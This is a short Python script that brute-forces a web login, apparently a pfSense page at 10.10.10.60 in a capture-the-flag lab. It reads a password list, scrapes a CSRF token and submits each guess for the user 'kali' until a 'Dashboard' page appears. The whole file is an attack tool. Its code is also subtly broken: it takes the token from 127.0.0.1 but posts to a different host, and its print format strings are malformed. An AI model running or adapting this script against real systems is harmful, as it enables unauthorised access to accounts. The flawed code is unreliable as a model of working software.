import requests
import re

re_csrf = 'csrfMagicToken = "(.*?)"'

s = requests.session()

lines = open('passwords.txt')

for password in lines:
	r = s.post('http://127.0.0.1/index.php')
	csrf = re.findall(re_csrf, r.text)[0]
	login = {'__csrf_magic': csrf, 'usernamefld': 'kali', 'passwordfld': password[:-1], 'login':'Login'}
	r = s.post('https://10.10.10.60/index.php', data=login)
	if "Dashboard" in r.text:
		print("Valid login %s % password[:-1]")
	else:
		print('failed %s % password[:-1]')
		s.cookies.clear()
